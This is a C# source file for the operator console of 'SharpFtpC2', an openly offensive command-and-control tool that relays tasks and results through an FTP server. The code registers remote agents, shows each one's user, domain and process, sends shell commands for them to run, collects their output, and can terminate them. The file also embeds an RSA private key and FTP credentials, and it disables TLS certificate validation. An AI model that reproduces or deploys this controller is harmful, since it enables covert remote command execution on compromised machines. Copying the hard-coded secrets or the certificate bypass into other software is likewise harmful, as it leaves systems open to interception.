/*
 * =========================================================================================
 * Project:       SharpFtpC2 - C2 (v1.0 Beta)
 * 
 * Description:   SharpFtpShell is a compact C# project that showcases the technique
 *                of tunneling Command and Control (C2) communication via FTP(S).
 * 
 * Author:        Jean-Pierre LESUEUR (@DarkCoderSc)
 * Email:         jplesueur@phrozen.io
 * Website:       https://www.phrozen.io
 * GitHub:        https://github.com/DarkCoderSc
 * Twitter:       https://twitter.com/DarkCoderSc
 * License:       Apache-2.0
 * =========================================================================================
 */

using FtpAgent;
using FtpC2;
using FtpC2.Responses;
using System.Collections.Concurrent;
using Microsoft.Extensions.CommandLineUtils;
using System.Data;
using FtpC2.Tasks;
using System.Text;
using System.Net;

class Program
{
    // EDIT HERE BEGIN ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    public static readonly string FtpHost = "127.0.0.1";
    public static readonly string FtpUser = "dark";
    public static readonly string FtpPwd = "toor";
    public static readonly bool FtpSecure = false;

    // Ensure that this contains the RSA Public / Private Key for C2, which is used to decrypt data received
    // from the agent. Utilize the RSAKeyHelper Tool to generate a fresh pair of Private and Public keys.
    public static readonly string EncodedPublicKey = "MIICCgKCAgEAwCgvEs3M3Xq9VsIokZcJCiZJBIvnpDsBh+TMHOFKKmkIAS43HtyxOJgCV4tJYyNLtnZXxym2FN4Y0AHuWcuub/4OfwhbmSll1LrcOymNJT8a8uSh2FkxPdYr3/TG18uPEvJ9KJhrPp2qyakCN3/URltcO/tFw7ETmauRKslUCNP1fgq71wE08B2dJfwjWa04x9pem90e5bXVg4JmJtdAoFNI++FFueg+/ohUtg13ZiY+U6Lz2tYcVoHATcMoGfERJeXJaOzOTsDCWxqrjAhQeN+NlFtT4euvH5e3Xb/7EivS4T3fdA0dMAy0iZ4Cf9je8C2GMst0pYwHQcW12LASwrmm90BBz/gFMLsBv/nrptQ1NbkFfdlDPf+kA0Ei3Q6CZoybIr9BOBbEEi59IH+0i3ILJF0YRLcOhaTmC6UKBvItq9YG/68VnFyuqb4cKf7mLN3fhF5RopLWjNGxdkwd5JqGl0dmDEnSjOcWRF46MSd2uVYtICtqVA2WN7IEpnOpbhnmYnwE1Dp/lTy4VW9oBGpnMxbfB2RISdOwFf+h59kDmUlYX1RgButpEmkklOQLOZHYEiLg1Pd5j+OyuTU84zZObcQC1VA8SGq6PStoh5S4dbgPRmEjHG8MBPPHBrr51ozid5T2k8UHOFeBn1QBXuODr0lGVgpyHy6MFtj7Dg0CAwEAAQ==";
    public static readonly string EncodedPrivateKey = "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";

    // Make sure this includes the RSA Public Key belonging to the remote agent, which is utilized for encrypting
    // data that is sent to the agent's destination.
    public static readonly string EncodedPeerPublicKey = "MIICCgKCAgEA6+URNSenrF9brgbRwEcxio7/N0D+6ZsL32Kx/j2/GVJPC4q3nwodBZDhsZalzi/CFdk4h0jiDyhTeSmU+Vq8RibQksPI0UbwL3+Mnuhrb13UifGoKMoaIY31vLMEeJ7Onyxnf15XiV4r2LorMHTwlqd1gyMR6dAu5nzshKA8yle06qrPpTP10pw7pR/iznKI/LAyJes/ox5JbO/Z1tmjtMDChx1+FgZB1wbSAlAw7fh04C3KH24vvobd5a1gMLGqBbAu3EWMXhj2Io/8aAq8f1nvau068Dl7tyD6ybD7/pam3XN3O30Grqcp2093ZnQvNbfTTaeLjZ1fs3MFkwzMXxtoKXtivqyLBH96ZI8IEMKG9IDGxPaOfIePJr7AyTinZ1g3Y/IIWor9v+wwAl8QuWf2zOTnBXSzN2jXKUDz29u3ITkhRnZJm0Vkma1Nuo6n7OB5m4lbUTQB4/cMNihUOvDSkPwh+uQF8loNQDLH5zO9oIEpdzoonsMmntOqYQMk2+uPGAF7/p3ZzRDsayhsbuHvnwzVbY8Tp9xedDj85TorehmPJJsTYmDsOahhh57E5Lpcfze32dO83z3slVHp/fYNpfHMLakV/gn0bvJFohCpCvxyUR6zSRVvvrPA0mHUAJPviX5lnenTTg8pwBLiBcGOGvdBromUDqCHlxQgEH0CAwEAAQ==";

    public static readonly int SynchronizeDelay = 1000;
    // EDIT HERE END ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

    public static CancellationTokenSource CancellationTokenSource = new();

    private static ConcurrentDictionary<Guid /* AgentId */, Agent> Agents = new();
    private static ConcurrentDictionary<Guid /* TaskId */, ResponseWrapper> TaskResponses = new();

    // ConcurrentBag is not suitable in my scenario so I'm using a classic List with locking mechanisms
    private static object TaskRequestsLock = new();
    private static List<TaskWrapper> TaskRequests = new();

    private static Guid ActiveAgent = Guid.Empty;    

    private static void RegisterNewTask(TaskWrapper taskRequest, Guid agentId)
    {
        taskRequest.Id = Guid.NewGuid();
        taskRequest.TaskType = taskRequest.GetType().Name;
        taskRequest.AgentId = agentId;        

        lock (TaskRequestsLock)
            TaskRequests.Add(taskRequest);
    }

    private static void RegisterNewCommandTask(TaskCommand.CommandKind command, Guid agentId)
    {
        TaskCommand taskCommand = new();
        taskCommand.Command = command;

        ///
        RegisterNewTask(taskCommand, agentId);
    }

    public static void ShowResult(ResponseWrapper response)
    {
        switch (response)
        {
            case ResponseShellCommand responseShellCommand:
                {
                    UX.ColorBackTicks($"Command: `{responseShellCommand.Command}`");                   

                    if (responseShellCommand.Stdout?.Length > 0)
                        Console.WriteLine(Encoding.UTF8.GetString(responseShellCommand.Stdout)); 

                    if (responseShellCommand.Stderr?.Length > 0)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;

                        Console.WriteLine(Encoding.UTF8.GetString(responseShellCommand.Stderr));

                        Console.ResetColor();
                    }

                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("EOF");
                    Console.ResetColor();

                    break;
                }

            default:
                {
                    UX.DisplayWarning($"`{response.GetType().Name}` result is not implemented or necessary.");

                    break;
                }
        }
    }

    private static void ControllerPrompt()
    {
        CommandLineApplication parser = new();

        parser.Command("help", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Show available commands.";

            cmd.OnExecute(() =>
            {
                Console.WriteLine(parser.GetHelpText());

                return 0;
            });
        });

        parser.Command("clear", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Clear console.";

            cmd.OnExecute(() =>
            {
                Console.Clear();

                return 0;
            });
        });

        parser.Command("exit", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Exit controller (Donnie Darko).";

            cmd.OnExecute(() =>
            {
                throw new ExitProgramExceptions();

                return 0;
            });
        });

        parser.Command("agents", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Show active agents.";

            cmd.OnExecute(() =>
            {
                if (Agents.Count == 0)
                {
                    UX.DisplayInfo("No agent so far.");

                    return 0;
                }

                DataTable table = new();

                table.Columns.Add("Id");
                table.Columns.Add("User@Computer");
                table.Columns.Add("Domain");
                table.Columns.Add("Process Id");                                
                table.Columns.Add("Is64Bit");

                table.Columns.Add("Last Seen");

                List<KeyValuePair<Guid, Agent>> agentPairs = Agents.ToList();

                agentPairs.Sort((pair2, pair1) => pair1.Value.DateTime.CompareTo(pair2.Value.DateTime));

                foreach (KeyValuePair<Guid, Agent> agentPair in agentPairs)
                {
                    Agent agent = agentPair.Value;
                    ///

                    DataRow row = table.NewRow();

                    row[0] = agentPair.Key;
                    row[1] = agentPair.Value.DisplayName();
                    row[2] = agent.Domain;
                    row[3] = agent.ProcessId;                                        
                    row[4] = agent.Is64BitProcess.ToString();
                    row[5] = (int)(DateTime.Now - agent.DateTime).TotalSeconds;

                    table.Rows.Add(row);
                }

                UX.DisplayTableToConsole(table);

                ///
                return 0;
            });
        });

        parser.Command("use", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Interact with a registered agent.";

            var arg = cmd.Argument("id", "Agent Id");

            cmd.OnExecute(() =>
            {
                if (Guid.TryParse(arg.Value, out Guid agentId))
                {
                    if (Agents.ContainsKey(agentId))
                        ActiveAgent = agentId;                    
                    else
                        throw new IndexOutOfRangeException($"Agent Id(`{agentId}`) not found.");
                }
                else
                    throw new FormatException($"'{arg.Value}' is not a valid GUID.");

                ///
                return 0;
            });
        });

        UX.DisplayControllerPrompt();

        string? action = Console.ReadLine();

        Console.WriteLine();

        if (string.IsNullOrEmpty(action))
            return;

        parser.Execute(action.Split(" "));

        Console.WriteLine();
    }

    private static void AgentPrompt()
    {
        if (ActiveAgent == Guid.Empty)
            return;        

        if (!Agents.TryGetValue(ActiveAgent, out Agent? agent))
        {
            ActiveAgent = Guid.Empty;
            return;
        }

        CommandLineApplication parser = new();

        parser.Command("help", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Show available commands.";

            cmd.OnExecute(() =>
            {
                Console.WriteLine(parser.GetHelpText());

                return 0;
            });
        });

        parser.Command("wait", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");

            var argument = cmd.Option("-s|--seconds", "Seconds to wait", CommandOptionType.SingleValue);

            cmd.Description = "Makes main thread hanging for a defined amount of seconds (default: 1).";

            cmd.OnExecute(() =>
            {
                int seconds = 1;
                if (argument.HasValue())
                {
                    Utilities.CheckIntegerArgument(argument);

                    int.TryParse(argument.Value(), out seconds);
                }

                Thread.Sleep(seconds * 1000);

                ///
                return 0;
            });
        });

        parser.Command("clear", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Clear console.";

            cmd.OnExecute(() =>
            {
                Console.Clear();

                return 0;
            });
        });

        parser.Command("exit", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Exit current agent context.";

            cmd.OnExecute(() =>
            {
                ActiveAgent = Guid.Empty;

                return 0;
            });
        });

        parser.Command("results", cmd =>
        {
            cmd.HelpOption("-?|-h|--help");
            cmd.Description = "Display remote agent tasks responses.";

            cmd.OnExecute(() =>
            {                
                List<Guid> responses = new();
                foreach(KeyValuePair<Guid, ResponseWrapper> entry in TaskResponses)
                {
                    if (entry.Value.AgentId == ActiveAgent)
                        responses.Add(entry.Key);
                }

                if (responses.Count == 0)
                {
                    UX.DisplayInfo("No result so far.");

                    return 0;
                }

                DataTable table = new();

                table.Columns.Add("#");
                table.Columns.Add("Kind");
                table.Columns.Add("Display Name");
                table.Columns.Add("When");
                
                foreach (KeyValuePair<Guid, ResponseWrapper> entry in 
                    TaskResponses.Where(x => responses.Contains(x.Key)).OrderBy(x => x.Value.DateTime)
                )
                {
                    DataRow row = table.NewRow();

                    row[0] = entry.Key;
                    row[1] = entry.Value.GetType().Name;
                    row[2] = entry.Value.DisplayName();
                    row[3] = Utilities.TimeSince(entry.Value.DateTime);

                    table.Rows.Add(row);
                }
                
                UX.DisplayTableToConsole(table);                

                return 0;                
            });

            parser.Command("results::show", cmd =>
            {
                cmd.HelpOption("-?|-h|--help");
                cmd.Description = "Display a task response content by its id.";

                var arg = cmd.Argument("id", "Task response identifier");

                cmd.OnExecute(() =>
                {
                    if (Guid.TryParse(arg.Value, out Guid responseId))
                    {
                        if (TaskResponses.TryGetValue(responseId, out ResponseWrapper? value))
                            ShowResult(value);
                        else
                            throw new IndexOutOfRangeException($"Response Id(`{responseId}`) not found.");
                    }
                    else
                        throw new FormatException($"'{arg.Value}' is not a valid GUID.");                    

                    ///
                    return 0;
                });
            });

            parser.Command("exec", cmd =>
            {
                cmd.HelpOption("-?|-h|--help");
                cmd.Description = "Run a shell command.";

                var args = cmd.Argument("command", "Shell command", true);

                cmd.OnExecute(() =>
                {
                    if (args.Values.Count == 0)
                        return 1;

                    TaskShellCommand task = new();
                    task.Command = string.Join(" ", args.Values);

                    RegisterNewTask(task, ActiveAgent);

                    return 0;
                });
            });

            parser.Command("kill", cmd =>
            {
                cmd.HelpOption("-?|-h|--help");
                cmd.Description = "Terminate remote agent process.";

                cmd.OnExecute(() =>
                {
                    RegisterNewCommandTask(TaskCommand.CommandKind.TerminateAgent, ActiveAgent);                    

                    return 0;
                });
            });
        });

        UX.DisplayAgentPrompt(agent);

        string? actions = Console.ReadLine();

        Console.WriteLine();

        if (string.IsNullOrEmpty(actions))
            return;

        foreach (string action in Utilities.SplitEx(actions))
            parser.Execute(action.Split(" "));

        Console.WriteLine();
    }

    public static void OnProcessExit(object? sender, EventArgs e)
    {        
        ///
    }

    public static void Main(string[] args)
    {
        // Important Notice: The delegate below renders the current application susceptible to
        // Man-in-the-Middle (MITM) attacks when utilizing SSL/TLS features.
        // This configuration was implemented to accommodate self-signed certificates.
        // However, it is strongly advised not to employ this approach in a production environment
        // if SSL/TLS security is expected.
        if (FtpSecure)
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
        ///

        AppDomain.CurrentDomain.ProcessExit += OnProcessExit;

        UX.DisplayBanner();
        ///

        List<Thread> daemons = new();

        // This thread is tasked with periodically gathering information about active and inactive agents.        
        daemons.Add(new Thread((object? obj) =>
        {
            if (obj == null)
                return;            

            C2Protocol c2Protocol = new(FtpHost, FtpUser, FtpPwd, FtpSecure);

            c2Protocol.SetupSelfEncryptionHelper(EncodedPublicKey, EncodedPrivateKey);
            c2Protocol.SetupPeerEncryptionHelper(EncodedPeerPublicKey);

            CancellationToken cancellationToken = (CancellationToken)obj;
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Refresh Agents Informations
                    c2Protocol.RefreshAgents(Agents);


                    ///
                    Thread.Sleep(SynchronizeDelay);
                }
                catch (Exception ex)
                {
                    UX.DisplayError($"@DaemonProbeThread: {ex.Message}");
                };
            }
        }));


        daemons.Add(new Thread((object? obj) =>
        {
            if (obj == null)
                return;

            C2Protocol c2Protocol = new(FtpHost, FtpUser, FtpPwd, FtpSecure);

            c2Protocol.SetupSelfEncryptionHelper(EncodedPublicKey, EncodedPrivateKey);
            c2Protocol.SetupPeerEncryptionHelper(EncodedPeerPublicKey);

            CancellationToken cancellationToken = (CancellationToken)obj;
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Synchronize Task Responses
                    c2Protocol.EnumerateResponses(TaskResponses);

                    // Register New Task Requests
                    lock (TaskRequestsLock)
                    {
                        foreach (TaskWrapper taskRequest in TaskRequests)
                        {
                            c2Protocol.RegisterNewTask(taskRequest);
                        }
                        TaskRequests.Clear();
                    }
                    
                    ///
                    Thread.Sleep(SynchronizeDelay);
                }
                catch (Exception ex)
                {
                    UX.DisplayError($"@DaemonSynchronizeThread: {ex.Message}");
                };
            }
        }));

        // The action to handle a CTRL+C signal on the console has been registered.
        // When triggered, it will instruct any associated cancellation tokens to properly
        // shut down their associated daemons.
        Console.CancelKeyPress += (sender, cancelEventArgs) =>
        {
            CancellationTokenSource.Cancel(); // Signal tokens that application needs to be closed.

            cancelEventArgs.Cancel = true; // Cancel default behaviour
        };

        // Start daemons
        foreach (Thread daemon in daemons)
            daemon.Start(CancellationTokenSource.Token);

        CancellationToken token = CancellationTokenSource.Token;
        while (!token.IsCancellationRequested)
        {
            try
            {
                if (ActiveAgent == Guid.Empty)
                    ControllerPrompt();
                else
                    AgentPrompt();

                // Dirty method to force messages to process during an IDLE time.
                Thread.Sleep(50);

            }
            catch (ExitProgramExceptions)
            {
                CancellationTokenSource.Cancel();

                break;
            }
            catch (Exception e)
            {
                UX.DisplayError(e.Message);

                Console.WriteLine();
            }
        }

        // Wait for daemons to join main thread
        foreach (Thread daemon in daemons)
            daemon.Join();
    }
}